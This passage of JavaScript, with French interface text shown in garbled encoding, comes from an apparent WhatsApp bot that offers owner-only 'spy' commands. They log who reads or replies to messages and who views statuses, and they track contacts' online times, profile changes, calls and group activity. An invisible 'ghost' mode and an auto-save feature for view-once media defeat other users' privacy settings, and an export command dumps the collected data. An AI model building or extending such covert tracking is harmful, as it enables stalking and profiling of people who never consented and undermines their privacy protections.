      let list = `â†©ï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *QUI A RÃ‰PONDU Ã€ TES MESSAGES*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      let i = 1;
      for (const [num, data] of Object.entries(uniqueRepliers)) {
        const displayName = data.name || "Non enregistrÃ©";
        const cleanNum = num.replace(/[^0-9]/g, '');
        list += `*${i}.* ${displayName !== "Non enregistrÃ©" ? `*${displayName}*` : "_Contact inconnu_"}\n`;
        list += `   ðŸ“± *NumÃ©ro:* +${cleanNum}\n`;
        list += `   â†©ï¸ ${data.count} rÃ©ponse(s) â€¢ ðŸ• ${data.lastTime}\n`;
        if (data.lastPreview) list += `   ðŸ’¬ _"${data.lastPreview.slice(0, 50)}..."_\n`;
        list += `   ðŸ“ž wa.me/${cleanNum}\n\n`;
        i++;
        if (i > 20) break;
      }
      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${spyData.replies.length} rÃ©ponses de ${Object.keys(uniqueRepliers).length} personnes`;
      return send(list);
    }

    case "spypresence":
    case "quiouvre":
    case "quiecrit": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      if (!spyData.presenceDetected || spyData.presenceDetected.length === 0) {
        return send(`âœï¸ *Aucune prÃ©sence dÃ©tectÃ©e*\n\n_Attends que quelqu'un ouvre ta discussion!_\n\nðŸ’¡ Ce systÃ¨me dÃ©tecte:\nâ€¢ âœï¸ Quand quelqu'un Ã©crit\nâ€¢ ðŸŽ¤ Quand quelqu'un enregistre un vocal\nâ€¢ ðŸ‘ï¸ Quand quelqu'un est actif dans ton chat`);
      }
      
      const uniquePresences = {};
      for (const presence of spyData.presenceDetected) {
        if (!uniquePresences[presence.number]) {
          uniquePresences[presence.number] = { 
            name: presence.name, 
            count: 0, 
            actions: new Set(),
            lastTime: new Date(presence.timestamp).toLocaleString("fr-FR")
          };
        }
        uniquePresences[presence.number].count++;
        uniquePresences[presence.number].actions.add(presence.action);
      }
      
      let list = `âœï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *QUI A OUVERT TON CHAT*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      let i = 1;
      for (const [num, data] of Object.entries(uniquePresences)) {
        const displayName = data.name || "Non enregistrÃ©";
        const cleanNum = num.replace(/[^0-9]/g, '');
        const actionsStr = Array.from(data.actions).map(a => {
          switch(a) {
            case "composing": return "âœï¸";
            case "recording": return "ðŸŽ¤";
            case "available": return "ðŸ‘ï¸";
            default: return "ðŸ“±";
          }
        }).join(" ");
        list += `*${i}.* ${displayName !== "Non enregistrÃ©" ? `*${displayName}*` : "_Contact inconnu_"}\n`;
        list += `   ðŸ“± *NumÃ©ro:* +${cleanNum}\n`;
        list += `   ${actionsStr} ${data.count} dÃ©tection(s) â€¢ ðŸ• ${data.lastTime}\n`;
        list += `   ðŸ’¬ wa.me/${cleanNum}\n\n`;
        i++;
        if (i > 20) break;
      }
      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${spyData.presenceDetected.length} dÃ©tections de ${Object.keys(uniquePresences).length} personnes\n\n*LÃ©gende:* âœï¸=Ã‰crit ðŸŽ¤=Vocal ðŸ‘ï¸=Actif`;
      return send(list);
    }

    case "spyhistory":
    case "spyall":
    case "espionhistorique": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const statusCount = spyData.statusViews?.length || 0;
      const readCount = spyData.messageReads?.length || 0;
      const repliesCount = spyData.replies?.length || 0;
      const presenceCount = spyData.presenceDetected?.length || 0;
      
      const uniqueStatusViewers = new Set((spyData.statusViews || []).map(v => v.viewer)).size;
      const uniqueReaders = new Set((spyData.messageReads || []).map(r => r.reader)).size;
      const uniqueRepliers = new Set((spyData.replies || []).map(r => r.replier)).size;
      const uniquePresence = new Set((spyData.presenceDetected || []).map(p => p.number)).size;
      
      let history = `ðŸ•µï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *HISTORIQUE ESPION COMPLET*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      
      history += `ðŸ“Š *RÃ‰SUMÃ‰ GLOBAL:*\n`;
      history += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
      history += `ðŸ‘ï¸ *Vues statuts:* ${statusCount} (${uniqueStatusViewers} personnes)\n`;
      history += `ðŸ“– *Messages lus:* ${readCount} (${uniqueReaders} personnes)\n`;
      history += `â†©ï¸ *RÃ©ponses:* ${repliesCount} (${uniqueRepliers} personnes)\n`;
      history += `âœï¸ *PrÃ©sences:* ${presenceCount} (${uniquePresence} personnes)\n\n`;
      
      // Top 5 de chaque catÃ©gorie
      if (spyData.statusViews && spyData.statusViews.length > 0) {
        history += `ðŸ‘ï¸ *DERNIÃˆRES VUES STATUTS:*\n`;
        const last5Status = spyData.statusViews.slice(0, 5);
        for (const v of last5Status) {
          history += `   â€¢ ${v.viewerName || "Inconnu"} (${v.viewer.replace(/[^0-9]/g, '').slice(-10)})\n`;
        }
        history += `\n`;
      }
      
      if (spyData.messageReads && spyData.messageReads.length > 0) {
        history += `ðŸ“– *DERNIÃˆRES LECTURES:*\n`;
        const last5Reads = spyData.messageReads.slice(0, 5);
        for (const r of last5Reads) {
          history += `   â€¢ ${r.readerName || "Inconnu"} - ${r.timeStr}\n`;
        }
        history += `\n`;
      }
      
      if (spyData.replies && spyData.replies.length > 0) {
        history += `â†©ï¸ *DERNIÃˆRES RÃ‰PONSES:*\n`;
        const last5Replies = spyData.replies.slice(0, 5);
        for (const r of last5Replies) {
          const preview = r.preview ? r.preview.slice(0, 30) + "..." : "";
          history += `   â€¢ ${r.replierName || "Inconnu"}: "${preview}"\n`;
        }
        history += `\n`;
      }
      
      if (spyData.presenceDetected && spyData.presenceDetected.length > 0) {
        history += `âœï¸ *DERNIÃˆRES PRÃ‰SENCES:*\n`;
        const last5Presence = spyData.presenceDetected.slice(-5).reverse();
        for (const p of last5Presence) {
          const emoji = p.action === "composing" ? "âœï¸" : p.action === "recording" ? "ðŸŽ¤" : "ðŸ‘ï¸";
          history += `   â€¢ ${emoji} ${p.name || "Inconnu"}\n`;
        }
        history += `\n`;
      }
      
      history += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      history += `âš™ï¸ *Ã‰TAT:*\n`;
      history += `â€¢ Spy statuts: ${protectionState.spyStatusViews ? "âœ…" : "âŒ"}\n`;
      history += `â€¢ Spy lectures: ${protectionState.spyReadReceipts ? "âœ…" : "âŒ"}\n`;
      history += `â€¢ Spy rÃ©ponses: ${protectionState.spyReplies ? "âœ…" : "âŒ"}\n`;
      history += `â€¢ Spy prÃ©sence: ${protectionState.spyPresence ? "âœ…" : "âŒ"}\n\n`;
      history += `ðŸ“‹ *COMMANDES:*\n`;
      history += `â€¢ \`.spyread\` â†’ Qui lit mes messages\n`;
      history += `â€¢ \`.spyreply\` â†’ Qui rÃ©pond\n`;
      history += `â€¢ \`.spypresence\` â†’ Qui ouvre mon chat\n`;
      history += `â€¢ \`.spy status\` â†’ Qui voit mes statuts\n`;
      history += `â€¢ \`.spy clear\` â†’ Effacer tout`;
      
      return send(history);
    }

    case "spystatus":
    case "quivoitmesstatus": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      if (!spyData.statusViews || spyData.statusViews.length === 0) {
        return send(`ðŸ‘ï¸ *Aucune vue de statut dÃ©tectÃ©e*\n\n_Poste un statut et attends que quelqu'un le voie!_\n\nðŸ’¡ Active le mode espion: \`.spy on\``);
      }
      
      const uniqueViewers = {};
      for (const view of spyData.statusViews) {
        if (!uniqueViewers[view.viewer]) {
          uniqueViewers[view.viewer] = { name: view.viewerName, count: 0, lastTime: view.timeStr };
        }
        uniqueViewers[view.viewer].count++;
      }
      
      let list = `ðŸ‘ï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *QUI VOIT TES STATUTS*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      let i = 1;
      for (const [num, data] of Object.entries(uniqueViewers)) {
        const displayName = data.name || "Non enregistrÃ©";
        const cleanNum = num.replace(/[^0-9]/g, '');
        list += `*${i}.* ${displayName !== "Non enregistrÃ©" ? `*${displayName}*` : "_Contact inconnu_"}\n`;
        list += `   ðŸ“± *NumÃ©ro:* +${cleanNum}\n`;
        list += `   ðŸ‘ï¸ ${data.count} vue(s) â€¢ ðŸ• ${data.lastTime}\n`;
        list += `   ðŸ’¬ wa.me/${cleanNum}\n\n`;
        i++;
        if (i > 20) break;
      }
      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${spyData.statusViews.length} vues de ${Object.keys(uniqueViewers).length} personnes`;
      return send(list);
    }

    case "spyon": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      protectionState.spyStatusViews = true;
      protectionState.spyReadReceipts = true;
      protectionState.spyReplies = true;
      protectionState.spyPresence = true;
      return send(`ðŸ•µï¸ *MODE ESPION ACTIVÃ‰* âœ…\n\nTu recevras des notifications quand:\nâ€¢ ðŸ‘ï¸ Quelqu'un voit tes statuts\nâ€¢ ðŸ“– Quelqu'un lit tes messages\nâ€¢ â†©ï¸ Quelqu'un rÃ©pond\nâ€¢ âœï¸ Quelqu'un Ã©crit dans ton chat\n\nðŸ’¡ \`.spyoff\` pour dÃ©sactiver`);
    }

    case "spyoff": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      protectionState.spyStatusViews = false;
      protectionState.spyReadReceipts = false;
      protectionState.spyReplies = false;
      protectionState.spyPresence = false;
      return send(`ðŸ•µï¸ *MODE ESPION DÃ‰SACTIVÃ‰* âŒ\n\nPlus de notifications espion.\n\nðŸ’¡ \`.spyon\` pour rÃ©activer`);
    }

    case "spyclear": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      spyData.statusViews = [];
      spyData.messageReads = [];
      spyData.replies = [];
      spyData.pendingMessages = {};
      spyData.presenceDetected = [];
      spyData.presenceCooldown = {};
      spyData.lastSeen = {};
      spyData.profileChanges = [];
      spyData.callHistory = [];
      spyData.groupActivity = [];
      return send(`ðŸ—‘ï¸ *Historique espion effacÃ©*\n\nâœ… Toutes les donnÃ©es supprimÃ©es:\nâ€¢ Vues de statuts\nâ€¢ Lectures de messages\nâ€¢ RÃ©ponses\nâ€¢ PrÃ©sences dÃ©tectÃ©es\nâ€¢ Historique connexions\nâ€¢ Changements de profil\nâ€¢ Historique appels\nâ€¢ ActivitÃ© groupes`);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ†• NOUVELLES COMMANDES ESPION AVANCÃ‰ES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    case "lastseen":
    case "derniereconnexion":
    case "online": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const entries = Object.entries(spyData.lastSeen || {});
      if (entries.length === 0) {
        return send(`ðŸ• *Aucune connexion dÃ©tectÃ©e*\n\n_Le tracker de connexion collecte les donnÃ©es en arriÃ¨re-plan._\n\nðŸ’¡ Les connexions seront enregistrÃ©es automatiquement.`);
      }
      
      let list = `ðŸ• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *DERNIÃˆRES CONNEXIONS*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      let i = 1;
      
      // Trier par derniÃ¨re activitÃ©
      const sorted = entries.sort((a, b) => {
        const timeA = a[1].lastOnline || a[1].lastOffline || 0;
        const timeB = b[1].lastOnline || b[1].lastOffline || 0;
        return timeB - timeA;
      });
      
      for (const [jid, data] of sorted.slice(0, 20)) {
        const name = data.name || "Inconnu";
        const cleanNum = jid.replace(/[^0-9]/g, '').slice(-10);
        const lastOnline = data.lastOnline ? new Date(data.lastOnline).toLocaleString("fr-FR") : "â€”";
        const lastOffline = data.lastOffline ? new Date(data.lastOffline).toLocaleString("fr-FR") : "â€”";
        const isOnlineNow = data.isOnline ? "ðŸŸ¢" : "âšª";
        
        list += `*${i}.* ${isOnlineNow} ${name}\n`;
        list += `   ðŸ“± +${cleanNum}\n`;
        list += `   ðŸŸ¢ DerniÃ¨re connexion: ${lastOnline}\n`;
        list += `   âšª DerniÃ¨re dÃ©connexion: ${lastOffline}\n\n`;
        i++;
      }
      
      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${entries.length} utilisateurs trackÃ©s`;
      return send(list);
    }

    case "profilechanges":
    case "changementsprofil":
    case "alertprofil": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      if (!spyData.profileChanges || spyData.profileChanges.length === 0) {
        return send(`ðŸ“¸ *Aucun changement de profil dÃ©tectÃ©*\n\n_Le systÃ¨me surveille automatiquement:_\nâ€¢ ðŸ“· Changements de photo de profil\nâ€¢ ðŸ“ Changements de bio/statut\nâ€¢ ðŸ‘¤ Changements de nom\n\nðŸ’¡ Les alertes seront envoyÃ©es en temps rÃ©el.`);
      }
      
      let list = `ðŸ“¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *CHANGEMENTS DE PROFIL*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      
      const changes = spyData.profileChanges.slice(-20).reverse();
      let i = 1;
      
      for (const change of changes) {
        const emoji = change.type === 'photo' ? 'ðŸ“·' : change.type === 'bio' ? 'ðŸ“' : 'ðŸ‘¤';
        const typeLabel = change.type === 'photo' ? 'Photo' : change.type === 'bio' ? 'Bio' : 'Nom';
        const time = new Date(change.timestamp).toLocaleString("fr-FR");
        
        list += `*${i}.* ${emoji} *${change.name || "Inconnu"}*\n`;
        list += `   ðŸ“± ${change.jid.replace(/[^0-9]/g, '').slice(-10)}\n`;
        list += `   ðŸ”„ *Type:* ${typeLabel}\n`;
        if (change.type !== 'photo') {
          list += `   ðŸ“¤ Avant: _${(change.oldValue || "").slice(0, 30)}..._\n`;
          list += `   ðŸ“¥ AprÃ¨s: _${(change.newValue || "").slice(0, 30)}..._\n`;
        }
        list += `   ðŸ• ${time}\n\n`;
        i++;
      }
      
      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${spyData.profileChanges.length} changements dÃ©tectÃ©s`;
      return send(list);
    }

    case "callhistory":
    case "historiqueappels":
    case "appels": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      if (!spyData.callHistory || spyData.callHistory.length === 0) {
        return send(`ðŸ“ž *Aucun appel enregistrÃ©*\n\n_Le systÃ¨me enregistre automatiquement:_\nâ€¢ ðŸ“ž Appels audio reÃ§us/Ã©mis\nâ€¢ ðŸ“¹ Appels vidÃ©o reÃ§us/Ã©mis\nâ€¢ â±ï¸ DurÃ©e et heure\nâ€¢ âŒ Appels manquÃ©s/rejetÃ©s`);
      }
      
      let list = `ðŸ“ž â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *HISTORIQUE DES APPELS*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      
      const calls = spyData.callHistory.slice(-20).reverse();
      let i = 1;
      
      for (const call of calls) {
        const emoji = call.type === 'video' ? 'ðŸ“¹' : 'ðŸ“ž';
        const direction = call.direction === 'in' ? 'ðŸ“¥ ReÃ§u' : 'ðŸ“¤ Ã‰mis';
        const status = call.status === 'missed' ? 'âŒ ManquÃ©' : call.status === 'rejected' ? 'ðŸš« RejetÃ©' : 'âœ… TerminÃ©';
        const time = new Date(call.timestamp).toLocaleString("fr-FR");
        const duration = call.duration ? `${Math.floor(call.duration / 60)}:${(call.duration % 60).toString().padStart(2, '0')}` : "â€”";
        
        list += `*${i}.* ${emoji} *${call.name || "Inconnu"}*\n`;
        list += `   ðŸ“± +${call.jid?.replace(/[^0-9]/g, '').slice(-10) || "?"}\n`;
        list += `   ${direction} â€¢ ${status}\n`;
        list += `   â±ï¸ DurÃ©e: ${duration} â€¢ ðŸ• ${time}\n\n`;
        i++;
      }
      
      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${spyData.callHistory.length} appels enregistrÃ©s`;
      return send(list);
    }

    case "groupspy":
    case "surveillancegroupe":
    case "groupactivity": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      if (!spyData.groupActivity || spyData.groupActivity.length === 0) {
        return send(`ðŸ‘¥ *Aucune activitÃ© de groupe dÃ©tectÃ©e*\n\n_Le systÃ¨me surveille automatiquement:_\nâ€¢ âž• Qui rejoint un groupe\nâ€¢ âž– Qui quitte un groupe\nâ€¢ ðŸ‘‘ Changements d'admin\nâ€¢ ðŸ“ Changements de nom/description\nâ€¢ ðŸ”— Changements de lien d'invitation`);
      }
      
      let list = `ðŸ‘¥ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *ACTIVITÃ‰ DES GROUPES*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      
      const activities = spyData.groupActivity.slice(-25).reverse();
      let i = 1;
      
      for (const act of activities) {
        let emoji, actionText;
        switch (act.action) {
          case 'add': emoji = 'âž•'; actionText = 'A rejoint'; break;
          case 'remove': emoji = 'âž–'; actionText = 'A quittÃ©'; break;
          case 'promote': emoji = 'ðŸ‘‘'; actionText = 'Promu admin'; break;
          case 'demote': emoji = 'ðŸ‘¤'; actionText = 'RÃ©trogradÃ©'; break;
          default: emoji = 'ðŸ“‹'; actionText = act.action;
        }
        const time = new Date(act.timestamp).toLocaleString("fr-FR");
        
        list += `*${i}.* ${emoji} *${act.participantName || "Inconnu"}*\n`;
        list += `   ðŸ‘¥ Groupe: ${act.groupName || "?"}\n`;
        list += `   ðŸ”„ ${actionText}\n`;
        list += `   ðŸ• ${time}\n\n`;
        i++;
      }
      
      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${spyData.groupActivity.length} Ã©vÃ©nements`;
      return send(list);
    }

    case "ghost":
    case "fantome": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const param = args?.toLowerCase();
      
      if (param === "on" || param === "activer") {
        spyConfig.ghostMode = true;
        spyConfig.ghostModeAdvanced.hideOnline = true;
        spyConfig.ghostModeAdvanced.hideTyping = true;
        spyConfig.ghostModeAdvanced.hideRead = true;
        spyConfig.ghostModeAdvanced.hideRecording = true;
        
        // ðŸ”¥ ACTIVER LE MODE GHOST RÃ‰EL
        startGhostMode(hani);
        
        // Envoyer immÃ©diatement prÃ©sence unavailable
        try {
          await hani.sendPresenceUpdate("unavailable");
        } catch (e) {}
        
        return send(`ðŸ‘» *MODE FANTÃ”ME ACTIVÃ‰* âœ…\n\nðŸ”’ *Tu es maintenant INVISIBLE:*\nâ€¢ âšª Personne ne te voit "en ligne"\nâ€¢ âœï¸ Personne ne voit quand tu Ã©cris\nâ€¢ ðŸ‘ï¸ Tes lectures ne sont pas envoyÃ©es\nâ€¢ ðŸŽ¤ Personne ne voit si tu enregistres\n\nâš ï¸ _Mode maintenu en continu!_\nâš ï¸ _Tu peux toujours tout voir des autres!_\n\nðŸ’¡ \`.ghost off\` pour dÃ©sactiver`);
        
      } else if (param === "off" || param === "desactiver") {
        spyConfig.ghostMode = false;
        spyConfig.ghostModeAdvanced.hideOnline = false;
        spyConfig.ghostModeAdvanced.hideTyping = false;
        spyConfig.ghostModeAdvanced.hideRead = false;
        spyConfig.ghostModeAdvanced.hideRecording = false;
        
        // ðŸ”¥ DÃ‰SACTIVER LE MODE GHOST
        stopGhostMode(hani);
        
        // Remettre prÃ©sence available
        try {
          await hani.sendPresenceUpdate("available");
        } catch (e) {}
        
        return send(`ðŸ‘» *MODE FANTÃ”ME DÃ‰SACTIVÃ‰* âŒ\n\nðŸ”“ *Tu es visible normalement:*\nâ€¢ ðŸŸ¢ Les autres te voient "en ligne"\nâ€¢ âœï¸ Les autres voient quand tu Ã©cris\nâ€¢ âœ… Les autres voient les confirmations de lecture\n\nðŸ’¡ \`.ghost on\` pour redevenir invisible`);
        
      } else if (param === "status" || !param) {
        const status = spyConfig.ghostMode ? "âœ… ACTIVÃ‰" : "âŒ DÃ‰SACTIVÃ‰";
        const intervalStatus = ghostModeInterval ? "ðŸŸ¢ En cours" : "âšª ArrÃªtÃ©";
        return send(`ðŸ‘» *MODE FANTÃ”ME: ${status}*\n\nâš™ï¸ *Ã‰tat systÃ¨me:* ${intervalStatus}\n\nâš™ï¸ *Configuration:*\nâ€¢ Cacher "en ligne": ${spyConfig.ghostModeAdvanced.hideOnline ? "âœ…" : "âŒ"}\nâ€¢ Cacher "Ã©crit...": ${spyConfig.ghostModeAdvanced.hideTyping ? "âœ…" : "âŒ"}\nâ€¢ Cacher lecture: ${spyConfig.ghostModeAdvanced.hideRead ? "âœ…" : "âŒ"}\nâ€¢ Cacher enregistrement: ${spyConfig.ghostModeAdvanced.hideRecording ? "âœ…" : "âŒ"}\n\nðŸ“‹ *Commandes:*\nâ€¢ \`.ghost on\` â†’ Invisible total\nâ€¢ \`.ghost off\` â†’ Visible normal`);
      }
      
      return send(`ðŸ‘» *MODE FANTÃ”ME*\n\nðŸ“‹ *Usage:*\nâ€¢ \`.ghost on\` â†’ Activer (invisible)\nâ€¢ \`.ghost off\` â†’ DÃ©sactiver (visible)\nâ€¢ \`.ghost status\` â†’ Voir l'Ã©tat`);
    }

    // ðŸ”„ AUTO-VIEWONCE: Envoyer les vues uniques automatiquement quand je rÃ©ponds
    case "autoviewonce":
    case "autovo":
    case "viewonceauto": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const param = args[0]?.toLowerCase();
      
      if (param === "on" || param === "activer" || param === "1") {
        protectionState.autoSendViewOnce = true;
        return send(`ðŸ“¸ *AUTO-VIEWONCE ACTIVÃ‰* âœ…\n\nðŸ”„ *Fonctionnement:*\nQuand quelqu'un t'envoie un message "vue unique", le bot le sauvegarde.\n\nQuand tu rÃ©ponds Ã  cette personne, le viewonce t'est envoyÃ© automatiquement en privÃ©!\n\nðŸ’¡ \`.autoviewonce off\` pour dÃ©sactiver`);
      } else if (param === "off" || param === "desactiver" || param === "0") {
        protectionState.autoSendViewOnce = false;
        return send(`ðŸ“¸ *AUTO-VIEWONCE DÃ‰SACTIVÃ‰* âŒ\n\nðŸ”• Les vues uniques ne seront plus envoyÃ©es automatiquement.\n\nðŸ’¡ \`.autoviewonce on\` pour rÃ©activer`);
      } else if (param === "status" || param === "list" || !param) {
        const status = protectionState.autoSendViewOnce ? "âœ… ACTIVÃ‰" : "âŒ DÃ‰SACTIVÃ‰";
        const pending = pendingViewOnce.size;
        let list = "";
        
        if (pending > 0) {
          list = "\n\nðŸ“‹ *ViewOnce en attente:*";
          pendingViewOnce.forEach((data, jid) => {
            const timeSince = Math.round((Date.now() - data.timestamp) / 60000);
            list += `\nâ€¢ ${data.senderName} (${data.mediaType}) - il y a ${timeSince}min`;
          });
        }
        
        return send(`ðŸ“¸ *AUTO-VIEWONCE: ${status}*\n\nðŸ“Š ViewOnce en attente: ${pending}${list}\n\nðŸ“‹ *Commandes:*\nâ€¢ \`.autoviewonce on\` â†’ Activer\nâ€¢ \`.autoviewonce off\` â†’ DÃ©sactiver\nâ€¢ \`.autoviewonce clear\` â†’ Vider la liste`);
      } else if (param === "clear" || param === "vider") {
        const count = pendingViewOnce.size;
        pendingViewOnce.clear();
        return send(`ðŸ“¸ *ViewOnce en attente vidÃ©!*\n\nðŸ—‘ï¸ ${count} viewonce(s) supprimÃ©(s)`);
      }
      
      return send(`ðŸ“¸ *AUTO-VIEWONCE*\n\nðŸ“‹ *Usage:*\nâ€¢ \`.autoviewonce on\` â†’ Activer\nâ€¢ \`.autoviewonce off\` â†’ DÃ©sactiver\nâ€¢ \`.autoviewonce status\` â†’ Voir l'Ã©tat\nâ€¢ \`.autoviewonce clear\` â†’ Vider les vues en attente`);
    }

    case "spyexport":
    case "exportspy":
    case "exporterespion": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      const now = new Date().toLocaleString("fr-FR").replace(/[/:]/g, "-");
      
      let exportData = `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
      exportData += `   EXPORT DONNÃ‰ES ESPION - ${now}\n`;
      exportData += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      
      // Stats gÃ©nÃ©rales
      exportData += `ðŸ“Š STATISTIQUES GÃ‰NÃ‰RALES\n`;
      exportData += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
      exportData += `â€¢ Vues de statuts: ${spyData.statusViews?.length || 0}\n`;
      exportData += `â€¢ Messages lus: ${spyData.messageReads?.length || 0}\n`;
      exportData += `â€¢ RÃ©ponses: ${spyData.replies?.length || 0}\n`;
      exportData += `â€¢ PrÃ©sences: ${spyData.presenceDetected?.length || 0}\n`;
      exportData += `â€¢ Connexions trackÃ©es: ${Object.keys(spyData.lastSeen || {}).length}\n`;
      exportData += `â€¢ Changements profil: ${spyData.profileChanges?.length || 0}\n`;
      exportData += `â€¢ Appels: ${spyData.callHistory?.length || 0}\n`;
      exportData += `â€¢ ActivitÃ©s groupe: ${spyData.groupActivity?.length || 0}\n\n`;
      
      // Vues de statuts
      if (spyData.statusViews && spyData.statusViews.length > 0) {
        exportData += `ðŸ‘ï¸ VUES DE STATUTS (${spyData.statusViews.length})\n`;
        exportData += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
        for (const v of spyData.statusViews.slice(-20)) {
          exportData += `â€¢ ${v.viewerName || "?"} (${v.viewer}) - ${v.timeStr || ""}\n`;
        }
        exportData += `\n`;
      }
      
      // Lectures
      if (spyData.messageReads && spyData.messageReads.length > 0) {
        exportData += `ðŸ“– LECTURES DE MESSAGES (${spyData.messageReads.length})\n`;
        exportData += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
        for (const r of spyData.messageReads.slice(-20)) {
          exportData += `â€¢ ${r.readerName || "?"} (${r.reader}) - ${r.timeStr || ""}\n`;
        }
        exportData += `\n`;
      }
      
      // RÃ©ponses
      if (spyData.replies && spyData.replies.length > 0) {
        exportData += `â†©ï¸ RÃ‰PONSES (${spyData.replies.length})\n`;
        exportData += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
        for (const r of spyData.replies.slice(-20)) {
          const preview = r.preview ? r.preview.slice(0, 50) : "";
          exportData += `â€¢ ${r.replierName || "?"}: "${preview}"\n`;
        }
        exportData += `\n`;
      }
      
      // PrÃ©sences
      if (spyData.presenceDetected && spyData.presenceDetected.length > 0) {
        exportData += `âœï¸ PRÃ‰SENCES DÃ‰TECTÃ‰ES (${spyData.presenceDetected.length})\n`;
        exportData += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
        for (const p of spyData.presenceDetected.slice(-20)) {
          const action = p.action === "composing" ? "Ã‰crit" : p.action === "recording" ? "Enregistre" : "Actif";
          exportData += `â€¢ ${p.name || "?"} (${p.number}) - ${action}\n`;
        }
        exportData += `\n`;
      }
      
      // Appels
      if (spyData.callHistory && spyData.callHistory.length > 0) {
        exportData += `ðŸ“ž HISTORIQUE APPELS (${spyData.callHistory.length})\n`;
        exportData += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
        for (const c of spyData.callHistory.slice(-20)) {
          const type = c.type === 'video' ? 'ðŸ“¹' : 'ðŸ“ž';
          const dir = c.direction === 'in' ? 'ReÃ§u' : 'Ã‰mis';
          exportData += `â€¢ ${type} ${c.name || "?"} - ${dir} - ${new Date(c.timestamp).toLocaleString("fr-FR")}\n`;
        }
        exportData += `\n`;
      }
      
